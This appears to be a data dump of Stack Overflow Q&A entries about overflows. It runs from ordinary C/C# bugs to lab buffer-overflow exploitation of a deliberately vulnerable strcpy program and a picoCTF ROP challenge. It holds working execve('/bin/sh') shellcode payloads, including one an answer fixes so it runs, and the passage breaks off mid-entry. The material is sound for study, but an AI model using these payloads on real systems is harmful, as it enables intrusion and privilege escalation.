        "Source": "https://stackoverflow.com/questions/76983981/changing-values-in-hex-editor-properly"
    },
    {
        "Title": "Overflow when reading a file",
        "Question": "When reading a simple file, I keep overflowing and reading bytes out of the file despite making sure I get the size of the file in bytes prior to the read.\nHere is my current code:\nFILE* file;\nint error_no = fopen_s(&file, filepath, \"r\");\n\nif (error_no != 0 || file == 0) {\n    std::cout << \"Error whilst reading file: \" + error_no;\n}\n\nfseek(file, 0, SEEK_END);\nsize_t size = ftell(file);\n\nchar* fileAsString = (char*) malloc(size+1);\n\nfseek(file, 0, SEEK_SET);\nfread(fileAsString, 1, size, file);\n\nfileAsString[size] = 0;\n\nstd::cout << \"\\n\" << size << \"\\n\";\nstd::cout << fileAsString;\n\nfclose(file);\n\nI am expecting to open the file, push the stream to the end of the file and use ftell to find the number of characters in the file.\nThen I make a string buffer to copy the file's content into.\nThen finally I reset the file stream and read it into my string buffer. I complete this by adding the end-of-string character at the end of the buffer.\nSadly this is what I get:\n114\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n        color = vec4(1.0, 0.0, 0.0, 1.0);\n}\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nI checked and the file contains 107 characters, which explains the 114 length and 7 '=' characters that shouldn't be there.\nThe actual file contents are:\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n    color = vec4(1.0, 0.0, 0.0, 1.0);\n}\n\nHope this is clear enough!\n",
        "Answer": "When you read a file with \"r\" mode, you are reading in text mode and your two-byte \\r\\n line endings are being converted to \\n strings in memory.  But ftell is returning the length of the file in bytes (with each newline counting for two bytes).  But you are marking the end of the string (by setting a null character) according to how  many bytes were in the file, as opposed to how many characters are in the string.  Since you have placed your null terminator past the end of the string, you have one character of junk for each newline in your original file.\nInstead, you probably want to preserve the bytes of the original file. To do this, try opening the file in \"rb\" mode to read it in binary mode which should prevent it from changing \\r\\n in the file to \\n in the string in memory.\n",
        "Source": "https://stackoverflow.com/questions/76958048/overflow-when-reading-a-file"
    },
    {
        "Title": "Index overflow in for loop with nested thread",
        "Question": "I am writing a testing utility (a WinForm) to check how a web site perform. To do so i set a number of request to make, with a list of parameters associated with requests. I can set the requests to happen in parallel or in sequence.\nIf i work in sequence everything is fine, but if i work in parallel i get a strange issue with the for loop.\nI know i may use Parallel.For but because i am investigating another bug related to parallelism i temporary used a regualr for, with a nested action executed directly or with a Task.Run().\nHere the problematic code :\nprivate void Run()\n{\n    ConcurrentBag<long> callTimes = new ConcurrentBag<long>();\n    int httpErrors = 0;\n    int progress = 0;\n\n    string uri = txtUrl.Text ?? string.Empty;\n    if (string.IsNullOrWhiteSpace(uri))\n        return;\n\n    Func<List<string>,int,long> testCall = (p,i) =>\n    {\n        try\n        {\n            using (var client = new HttpClient())\n            {\n                Stopwatch timer = new Stopwatch();\n                timer.Start();\n\n                string actualUrl = string.Format(uri, p.ToArray());\n                var getTask = client.GetAsync(actualUrl);\n                getTask.Wait();\n\n                timer.Stop();\n\n                var result = getTask.Result;\n                if (result == null || (int)result.StatusCode >= 400)\n                {\n                    txtErrors.ThreadSafeAppendText($\"Connection error {(result?.StatusCode.ToString() ?? \"NULL\")}'\\r\\n\");\n                    Interlocked.Increment(ref httpErrors);\n                }\n\n                return timer.ElapsedMilliseconds;\n            }\n        }\n        catch ( Exception actionErr)\n        {\n            txtErrors.ThreadSafeAppendText($\"Error while execution callAction {i} with parameters '{string.Join(\", \" , p)}' : \\r\\n\" + actionErr.Message);\n        }\n\n        return -1;\n    };\n\n    try\n    {\n        List<List<string>> parameters = this.ParseParameters();\n        int parametersCount = parameters.Count;\n        int executions = (int)updRequests.Value;\n\n        //used to randomly access parameters in a way suitable also for the parallel scenario (i precompute all the random number i need while parallel processing is not yet started)\n        Random rng = new Random();\n        List<int> randoms = new List<int>();\n        for (int i = 0; i < executions; i++)\n            randoms.Add(rng.Next(0, parametersCount));\n\n        //randoms.Count is guaranteed to be equal to executions \n\n\n        for ( int index = 0; index < executions; index++)\n        {\n            Action parallelAction = () =>\n            {\n                int currentIndex = index;\n                List<string> currentParameter = parameters[randoms[currentIndex] % parametersCount]; //<<--- strange overflow here currentIndex >= executions\n                callTimes.Add(testCall(currentParameter, currentIndex));\n\n                Interlocked.Increment(ref progress);\n\n                if (progress % 10 == 0)\n                    prbProgress.ThreadSafeAction(this.RefreshProgressBar, progress, executions);\n            };\n\n            if (chkParallelExecution.Checked)\n                Task.Run(parallelAction);\n            else\n                parallelAction();\n        }\n\n\n        this.Reporting(callTimes, httpErrors);\n    }\n    catch (Exception err)\n    {\n        txtErrors.ThreadSafeAppendText($\"Error while running stress test : \\r\\n\" + err.Message);\n    }\n}\n\nThe strange thing i don't understand is how the variable called currentIndex become >= executions variable, because only the loop manipulate those two variable and should enforce the opposite.\nSo i think i am missing something in my understanding on how parallel processing happen here.\n",
        "Answer": "There is a fairly well known issue with capturing loop variables.\nSo you should probably write\nfor ( int index = 0; index < executions; index++)\n{\n    int currentIndex = index;\n    Action parallelAction = () =>\n    {\n        ...\n\nAnother possible issue:\nparameters[randoms[currentIndex] % parametersCount];\n\nFor all you know the values in randoms could all be zero. Are you sure you don't want to create an array of 0..executions, and shuffle this instead?\nI can't see any obvious reasons why this example should fail however. But errors with indices etc should be rather obvious if you do some debugging.\n",
        "Source": "https://stackoverflow.com/questions/76874536/index-overflow-in-for-loop-with-nested-thread"
    },
    {
        "Title": "Not getting the expected output when running a shell code in a buffer overflow",
        "Question": "After finding the eip offset i'm trying to input some shell code to my program. With the following command run $(python -c 'print(\"A\"*108 + \"BBBB\")') i get the following output\nProgram received signal SIGSEGV, Segmentation fault.\n0x42424242 in ?? ()\n\nNow the problem occurs when i try to add my shell code. When i input\nrun $(python -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)')\n\ni don't get what i was exepected, the return address being overwritten with B's, but i get the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x90c290c2 in ?? ()\n\nIt does work, when i increase the number of B's to 48 and decrease the number of NOPs to 35, but i'm not quite understanding why this doesn't work with more NOPs and less B's for the return address. One other thing i do not understand is that i'm not seeing any NOPs in my stack.\n(gdb) x/200x $esp\n0xffffd2a0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2b0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2c0: 0x42424242  0x42424242  0x00424242  0x00000001\n0xffffd2d0: 0xffffd398  0x68e47ce5  0x9e780f0a  0x00000000\n0xffffd2e0: 0x00000000  0x00000000  0xffffd3e0  0x0804b519\n0xffffd2f0: 0x00000000  0x08049c76  0xffffd3e0  0x0804b52d\n0xffffd300: 0x00000000  0x00000000  0x00000000  0x0804968d\n0xffffd310: 0x00000040  0x0000000c  0x00000040  0x00000008\n0xffffd320: 0x00040000  0x00000040  0x00002000  0x00300000\n0xffffd330: 0x00090000  0x00040000  0x00002000  0x00008000\n0xffffd340: 0xffffd370  0xffffd3d4  0x00000002  0x00000001\n0xffffd350: 0x00000006  0x00000045  0x00000001  0x00300000\n0xffffd360: 0x000c0000  0x00000004  0x00000001  0x00000000\n0xffffd370: 0xffffffff  0x00000000  0x080e3620  0x00000000\n0xffffd380: 0x00000000  0x00000000  0xffffd3b0  0x080e3ff4\n0xffffd390: 0x00000002  0x00000000  0x00000000  0x08049688\n0xffffd3a0: 0x00000000  0x00000000  0x00000000  0x08049688\n0xffffd3b0: 0x0804968d  0x00000002  0xffffd3d4  0x00000000\n0xffffd3c0: 0x00000000  0x00000000  0xffffd3cc  0x00000000\n0xffffd3d0: 0x00000002  0xffffd5d2  0xffffd609  0x00000000\n0xffffd3e0: 0xffffd6a5  0xffffd6b5  0xffffd6c9  0xffffd6ff\n0xffffd3f0: 0xffffd70c  0xffffd746  0xffffd773  0xffffd78a\n0xffffd400: 0xffffd79e  0xffffd7d1  0xffffd80f  0xffffd826\n0xffffd410: 0xffffd83e  0xffffd881  0xffffd891  0xffffd89d\n0xffffd420: 0xffffd8bd  0xffffd8cc  0xffffd8ff  0xffffd90a\n0xffffd430: 0xffffd925  0xffffd93a  0xffffd94f  0xffffd95e\n0xffffd440: 0xffffd97e  0xffffd9ac  0xffffd9bb  0xffffd9c4\n0xffffd450: 0xffffda14  0xffffda22  0xffffda33  0xffffda48\n0xffffd460: 0xffffda60  0xffffda6c  0xffffdaf0  0xffffdb01\n0xffffd470: 0xffffdb35  0xffffdb64  0xffffdbb0  0xffffdbbf\n0xffffd480: 0xffffdbd4  0xffffdbeb  0xffffdc09  0xffffdc1d\n0xffffd490: 0xffffdc25  0xffffdc3b  0xffffdc6d  0xffffdc78\n0xffffd4a0: 0xffffdc80  0xffffdc99  0xffffdcb4  0xffffdcbf\n0xffffd4b0: 0xffffdcd0  0xffffdcef  0xffffdd21  0xffffdd35\n0xffffd4c0: 0xffffdd53  0xffffdd6a  0xffffdd83  0xffffdda1\n0xffffd4d0: 0xffffde16  0xffffde2c  0xffffde3c  0xffffdf08\n0xffffd4e0: 0xffffdf1a  0xffffdf50  0xffffdf6c  0xffffdf84\n0xffffd4f0: 0xffffdf9b  0x00000000  0x00000020  0xf7ffc570\n0xffffd500: 0x00000021  0xf7ffc000  0x00000033  0x000006f0\n0xffffd510: 0x00000010  0xbfebfbff  0x00000006  0x00001000\n0xffffd520: 0x00000011  0x00000064  0x00000003  0x08048034\n0xffffd530: 0x00000004  0x00000020  0x00000005  0x00000009\n0xffffd540: 0x00000007  0x00000000  0x00000008  0x00000000\n0xffffd550: 0x00000009  0x08049660  0x0000000b  0x000003e8\n0xffffd560: 0x0000000c  0x000003e8  0x0000000d  0x000003e8\n0xffffd570: 0x0000000e  0x000003e8  0x00000017  0x00000000\n0xffffd580: 0x00000019  0xffffd5bb  0x0000001a  0x00000002\n0xffffd590: 0x0000001f  0xffffdfc1  0x0000000f  0xffffd5cb\n0xffffd5a0: 0x0000001b  0x0000001c  0x0000001c  0x00000020\n0xffffd5b0: 0x00000000  0x00000000  0x62000000  0x9e72e32a\n\n\nI'm using Python 3. The shell code is 25 bytes long. I have already disabled ASLR.\nThis is my code in C\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[100];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\n",
        "Answer": "Python3's string literals \"...\" default to UTF-8 (Unicode) encoding when printing, not 8-bit ASCII (ISO-8859-1/Latin-1). As a result extra characters are being output that renders your shellcode unusable.\nIf you were to run your Python command like:\npython -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)' | hexdump -C\n\nPiping the output through hexdump can make the issue more obvious. The output will look something like:\n00000000  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c2 90  |................|\n*\n00000070  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c3 ab  |................|\n00000080  0b 5b 31 c3 80 31 c3 89  31 c3 92 c2 b0 0b c3 8d  |.[1..1..1.......|\n00000090  c2 80 c3 a8 c3 b0 c3 bf  c3 bf c3 bf 2f 62 69 6e  |............/bin|\n000000a0  2f 73 68 42 42 42 42 42  42 42 42 42 42 42 42 42  |/shBBBBBBBBBBBBB|\n000000b0  42 42 42 42 42 42 42 0a                           |BBBBBBB.|\n000000b8\n\nYou'll notice that the value C2 and C3 have been inserted into the middle of your code for those characters that are >= 0x80. As a result the output is no longer suitable as shellcode.\nIf you switch to using Python2 the problem would resolve itself since it doesn't default to a Unicode character set. Something that works for Python2 and Python3 is the use of byte string literals b'...' and use sys.stdout.buffer.write to output the bytes to standard output.\nA command like this should work in GDB:\nrun $(python -c \"import sys; sys.stdout.buffer.write(b'\\x90'*63 + b'\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68' + b'B' * 20)\")\n\n",
        "Source": "https://stackoverflow.com/questions/78100496/not-getting-the-expected-output-when-running-a-shell-code-in-a-buffer-overflow"
    },
    {
        "Title": "EIP doesn&#39;t get overwritten when perfoming a buffer overflow attack",
        "Question": "I was watching this video on youtube: https://www.youtube.com/watch?v=1S0aBV-Waeo and i was trying to do the same steps shown in the video, but i can't seem to overwrite the EIP. I don't know if it's because the gdb may have changed during the years, or if anything else has. What i get when i try to overflow is the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x080491ac in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n\nI can't seem to overwrite the eip, no matter how large my input is. The code is the same as shown in the video with a smaller buffer size.\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[10];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\nI also get asked the following when running my program in gdb for the first time\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \n\nThis is the register info in gdb\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b2          -10574\nedx            0xffffd396          -11370\nebx            0x804bff4           134529012\nesp            0xffffd390          0xffffd390\nebp            0xffffd3a8          0xffffd3a8\nesi            0xffffd480          -11136\nedi            0xf7ffcb60          -134231200\neip            0x80491a3           0x80491a3 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n\n(gdb) x/20x $esp\n0xffffd390: 0xffffffff  0x4141d3d4  0x41414141  0x41414141\n0xffffd3a0: 0xffff0041  0xf7e1fe2c  0x00000000  0xf7c20af9\n0xffffd3b0: 0x00000000  0x00000000  0x080482e7  0xf7c20af9\n0xffffd3c0: 0x00000002  0xffffd474  0xffffd480  0xffffd3e0\n0xffffd3d0: 0xf7e1fe2c  0x0804907d  0x00000002  0xffffd474\n\nI'm compiling with the following flags\ngcc -o example2 -fno-stack-protector -no-pie -m32 -g -z execstack example2.c -w\n\nThe whole interaction on gdb\n(gdb) disassemble main\nDump of assembler code for function main:\n   0x080497d5 <+0>: lea    0x4(%esp),%ecx\n   0x080497d9 <+4>: and    $0xfffffff0,%esp\n   0x080497dc <+7>: push   -0x4(%ecx)\n   0x080497df <+10>:    push   %ebp\n   0x080497e0 <+11>:    mov    %esp,%ebp\n   0x080497e2 <+13>:    push   %ebx\n   0x080497e3 <+14>:    push   %ecx\n   0x080497e4 <+15>:    sub    $0x10,%esp\n   0x080497e7 <+18>:    call   0x804981c <__x86.get_pc_thunk.ax>\n   0x080497ec <+23>:    add    $0x9a808,%eax\n   0x080497f1 <+28>:    mov    %ecx,%edx\n   0x080497f3 <+30>:    mov    0x4(%edx),%edx\n   0x080497f6 <+33>:    add    $0x4,%edx\n   0x080497f9 <+36>:    mov    (%edx),%edx\n   0x080497fb <+38>:    sub    $0x8,%esp\n   0x080497fe <+41>:    push   %edx\n   0x080497ff <+42>:    lea    -0x12(%ebp),%edx\n   0x08049802 <+45>:    push   %edx\n   0x08049803 <+46>:    mov    %eax,%ebx\n   0x08049805 <+48>:    call   0x8049020\n   0x0804980a <+53>:    add    $0x10,%esp\n   0x0804980d <+56>:    mov    $0x0,%eax\n--Type <RET> for more, q to quit, c to continue without paging--\n   0x08049812 <+61>:    lea    -0x8(%ebp),%esp\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\nEnd of assembler dump.\n(gdb) break *0x08049805\nBreakpoint 1 at 0x8049805: file example.c, line 6.\n(gdb) break *0x08049812\nBreakpoint 2 at 0x8049812: file example.c, line 9.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/r3/buffer-overflows/bo in memory example/example AAAAAAAAAAAAAAAAAAAAAAAAA\n\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \nDebuginfod has been disabled.\nTo make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.\n\nBreakpoint 1, 0x08049805 in main (argc=2, argv=0xffffd464) at example.c:6\n6       strcpy(buffer, argv[1]);\n(gdb) info reg\neax            0x80e3ff4           135151604\necx            0xffffd330          -11472\nedx            0xffffd306          -11514\nebx            0x80e3ff4           135151604\nesp            0xffffd2f0          0xffffd2f0\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049805           0x8049805 <main+48>\neflags         0x292               [ AF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd2f0: 0xffffd306  0xffffd6a4  0x00000000  0x080497ec\n0xffffd300: 0x080ade17  0x080e7c04  0x08049030  0x080ae037\n0xffffd310: 0xffffd330  0x080e3ff4  0xffffd428  0x08049ceb\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n(gdb) c\nContinuing.\n\nBreakpoint 2, main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b0          -10576\nedx            0xffffd312          -11502\nebx            0x80e3ff4           135151604\nesp            0xffffd300          0xffffd300\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049812           0x8049812 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd300: 0x080ade17  0x41417c04  0x41414141  0x41414141\n0xffffd310: 0x41414141  0x41414141  0x41414141  0x00414141\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n0xffffd340: 0x080e3ff4  0x0804968d  0x00000002  0xffffd464\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0804981b in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0x41414141          1094795585\nedx            0xffffd312          -11502\nebx            0x41414141          1094795585\nesp            0x4141413d          0x4141413d\nebp            0x41414141          0x41414141\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x804981b           0x804981b <main+70>\neflags         0x10286             [ PF SF IF RF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0x4141413d: Cannot access memory at address 0x4141413d\n(gdb) c\nContinuing.\n\nProgram terminated with signal SIGSEGV, Segmentation fault.\nThe program no longer exists.\n\n",
        "Answer": "This code\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\n\nrestores registers from their saved location on stack. However, you've overwritten the stack contents, so all the registers are now set to 0x4141... values. And that causes the lea    -0x4(%ecx),%esp instruction to SIGSEGV, since ECX points to inaccessible memory.\nAs ssbssa commented, this is happening due to stack realignment (which itself is needed to deal with 64-bit aligned (newer) AVX etc.).\nIf I turn stack realignment off with -mpreferred-stack-boundary=2, the code becomes:\n   0x08049176 <+0>:     push   %ebp\n   0x08049177 <+1>:     mov    %esp,%ebp\n   0x08049179 <+3>:     sub    $0xc,%esp\n   0x0804917c <+6>:     mov    0xc(%ebp),%eax\n   0x0804917f <+9>:     add    $0x4,%eax\n   0x08049182 <+12>:    mov    (%eax),%eax\n   0x08049184 <+14>:    push   %eax\n   0x08049185 <+15>:    lea    -0xa(%ebp),%eax\n   0x08049188 <+18>:    push   %eax\n   0x08049189 <+19>:    call   0x8049050 <strcpy@plt>\n   0x0804918e <+24>:    add    $0x8,%esp\n   0x08049191 <+27>:    mov    $0x0,%eax\n   0x08049196 <+32>:    leave\n   0x08049197 <+33>:    ret\n\nand the RIP overwrite works:\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n(gdb) x/i $pc\n=> 0x41414141:  Cannot access memory at address 0x41414141\n\n",
        "Source": "https://stackoverflow.com/questions/78053915/eip-doesnt-get-overwritten-when-perfoming-a-buffer-overflow-attack"
    },
    {
        "Title": "Buffer Overflow: Why does buffer assignment impact other variables?",
        "Question": "\nvoid foo() {\n    int value = 0;\n    char buf[4];\n    buf[4] = 1;\n\n\n    printf(\"value: %d\\n\", value);\n}\n\nint main() {\n    foo();\n    return 0;\n}\n\n\n\nWhy does 'value' print 1?\nI believe this has to do with buffer overflow and little endian but I am finding it hard to grasp.\n",
        "Answer": "Because it is Undefined Behaviour.\nIt is enough to change the optimization options and you will get different results.\nGodbolt for example:\n\nWith -O0 : 1\nWith -Os : 0\n\nBut it does not have to be like this. It can end up in the segfault or something else may happen.\nhttps://godbolt.org/z/TEbWbMvsa\n\nI understand it's undefined behavior. I was just wondering how this is\nrelated to little endian. When I went past buf[3] into buf[4], it\nstarted changing the next byte in memory. How do I know the next byte\nin memory is 'value'?\n\nYou cant know it. Order is not specified. value can be optimized out and not stored on the stack at all. You need to know your ABI and compiler very well to predict it.\nIn your case:\n+ 0x07: value byte 4  MSB\n+ 0x06: value byte 3\n+ 0x05: value byte 2\n+ 0x04: value byte 1  LSB\n+ 0x03: buf[3]\n+ 0x02: buf[2]\n+ 0x01: buf[1]\n+ 0x00: buf[0]\n\n",
        "Source": "https://stackoverflow.com/questions/77937810/buffer-overflow-why-does-buffer-assignment-impact-other-variables"
    },
    {
        "Title": "ROP - The use of the jmp esp",
        "Question": "I was playing some picoCTF challenges today and I found myself stuck in a challenge.\nDigging around the internet, I found a solution online which I cannot fully grasp.\nThe challenge (whose name I won't spoil for those who are playing picoCTF) revolves around a vulnerable x86 ELF, and it involves using ROP gadgets to gain a shell, however the checksec reveals that the binary is not PIE, and there is no NX enabled.\nBy breaking at ret of the vulnerable function, I noticed that the EAX register contains the start address of the buffer on the stack. Moreover, I found out that the offset between the start of the buffer and the saved EIP is 28 bytes.\nSo my first guess was to craft a sufficiently short shellcode, place it inside the buffer preceeded by a NOP sled, and overwrite the saved EIP with a gadget jumping to the content of the EAX register, aka the start of my buffer.\nHowever, I found out that this approach is not working.\nThe shellcode I crafted is:\nint 0x3   ; used for debugging purposes\nxor eax, eax\npush eax\npush 0x0068732f\npush 0x6e69622f\nxor ebx, ebx\npush eax\npush ebx\nmov ecx, esp\nmov al, 0xb\nint 0x80\n\nI assembled it using pwntool's asm library, setting the architecture to i386.\nThe debugger reveals the following after few steps in:\npwndbg> \n\nProgram received signal SIGSEGV, Segmentation fault.\n0xff854a01 in ?? ()\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS / show-flags off / show-compact-regs off ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n EAX  0x0\n EBX  0x0\n ECX  0x80e5300 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2088\n EDX  0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EDI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n ESI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EBP  0x90909090\n ESP  0xff854a00 \u25c2\u2014 0x0\n EIP  0xff854a01 \u25c2\u2014 0x2f000000\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM / i386 / set emulate on ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   0xff8549f3    push   eax\n   0xff8549f4    push   0x68732f\n   0xff8549f9    push   0x6e69622f\n   0xff8549fe    xor    ebx, ebx\n   0xff854a00    add    byte ptr [eax], al\n    \u2193\n \u25ba 0xff854a01    add    byte ptr [eax], al\n   0xff854a03    add    byte ptr [edi], ch\n   0xff854a05    bound  ebp, qword ptr [ecx + 0x6e]\n   0xff854a08    das    \n   0xff854a09    jae    0xff854a73                    <0xff854a73>\n    \u2193\n   0xff854a73    add    byte ptr [eax], al\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n00:0000\u2502 esp eip-1 0xff854a00 \u25c2\u2014 0x0\n01:0004\u2502           0xff854a04 \u25c2\u2014 '/bin/sh'\n02:0008\u2502           0xff854a08 \u25c2\u2014 0x68732f /* '/sh' */\n03:000c\u2502           0xff854a0c \u25c2\u2014 0x0\n04:0010\u2502 edx       0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n... \u2193              2 skipped\n07:001c\u2502           0xff854a1c \u25c2\u2014 